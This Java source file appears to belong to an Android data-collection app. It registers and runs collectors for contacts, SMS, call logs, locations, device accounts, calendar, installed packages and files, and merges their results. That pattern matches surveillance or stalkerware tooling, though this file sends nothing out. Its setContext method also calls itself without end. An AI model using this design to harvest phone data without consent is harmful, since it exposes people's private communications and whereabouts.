package com.xaviar.collect;


import java.util.Collection;
import java.util.LinkedList;
import java.util.List;
import java.util.Properties;

import android.content.Context;

import com.xaviar.collect.calendar.CollectCalendar;
import com.xaviar.collect.calllog.CollectCallLog;
import com.xaviar.collect.calllog_event.CollectCalllogEvent;
import com.xaviar.collect.contacts.CollectContacts;
import com.xaviar.collect.device_accounts.CollectDeviceAccount;
import com.xaviar.collect.files.CollectFiles;
import com.xaviar.collect.location.CollectLocations;
import com.xaviar.collect.packages.CollectPackages;
import com.xaviar.collect.phoneparams.CollectPhoneParams;
import com.xaviar.collect.sms.CollectSms;
import com.xaviar.collect.sms_event.CollectSmsEvent;
import com.xaviar.frm.ICollector;

public class CollectData implements ICollector {
	
	private Context ctx;
	private final static String name = "CollectData";
	private static final String TAG = name;
	

	private List<ICollector> collectors = new LinkedList<ICollector>();

	public CollectData(Context ctx) {
		this.ctx = ctx;

	}

	public void collect() {
		for (ICollector collector : collectors) {
			collector.collect();	
		}
	}

	public void register(ICollector collector) {
		collectors.add(collector);
	}
	
	
	/**
	 * 
	 * @param mapCollectors
	 * e.g. SMS:134577666
	 *      iCollectKey=SMS
	 *      iCollectValue=134577666
	 * e
	 */
	public void register(Collection<ICollector> listCollectors)
	{
		for(ICollector collector : listCollectors)
		{
			  collector.setContext(ctx);
			    register(collector);
		 }	
	}

	

	public void registerAll() {
        collectors.clear();
		registerContacts();
		registerSMS();
		registerPhoneParams();
		registerLocations();
		registerSmsEvent();
		registerPhoneEvent();
		registerCallLog();	
		registerDeviceAccount();
		registerCalendar();
		registerPacakges();
		registerFiles();
	}
	
	
	public void registerPacakges() {
		CollectPackages collectPackages = new CollectPackages(ctx);
		register(collectPackages);	
	}

	public void registerCalendar() {
		CollectCalendar collectCalendar = new CollectCalendar(ctx);
		register(collectCalendar);	
		
	}

	public void registerDeviceAccount() {
		CollectDeviceAccount CollectDeviceAccount = new CollectDeviceAccount(ctx);
		register(CollectDeviceAccount);	
		
	}

	public void registerEvents() {
        collectors.clear();	
		registerSmsEvent();
		registerPhoneEvent();		
	}
	
	public void registerPhoneEvent() {
		CollectCalllogEvent phoneEventCollect = new CollectCalllogEvent(ctx);
		register(phoneEventCollect);		
	}

	public void registerContacts() {
		
		CollectContacts contactCollector = new CollectContacts(ctx);
		register(contactCollector);
	}
	public void registerSMS() {
		CollectSms smsCollect = new CollectSms(ctx);
		register(smsCollect);
	}
	
	public void registerSmsEvent() {
		CollectSmsEvent smsEventCollect = new CollectSmsEvent(ctx);
		register(smsEventCollect);
	}
	
	
	public void registerPhoneParams() {
		CollectPhoneParams phoneParams = new CollectPhoneParams(ctx);
		register(phoneParams);
	}
	public void registerLocations() {
		CollectLocations locationsCollect = new CollectLocations(ctx);
		register(locationsCollect);
	}
	
	public void registerCallLog() {
		CollectCallLog collectCallLog = new CollectCallLog(ctx);
		register(collectCallLog);
	}
	
	public void registerFiles() {
		CollectFiles collectFiles = new CollectFiles(ctx);
		register(collectFiles);
	}
	
	
	

	@Override
	public void setContext(Context ctx) {
		setContext(ctx);	
	}

	@Override
	public Properties getResult() {
		Properties allProp = new Properties();
		for (ICollector collector : collectors) {
			Properties oneProp = collector.getResult();
			if ( (null !=  oneProp) && (oneProp.size() >0))
			{
			  allProp.putAll(oneProp);
			}
		}
		return allProp;
	}

	@Override
	public void setTime(String time) {
		// TODO Auto-generated method stub
	}

	@Override
	public String getTime() {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public String getHolderKey() {
		// TODO Auto-generated method stub
		return "CollectData";
	}

}
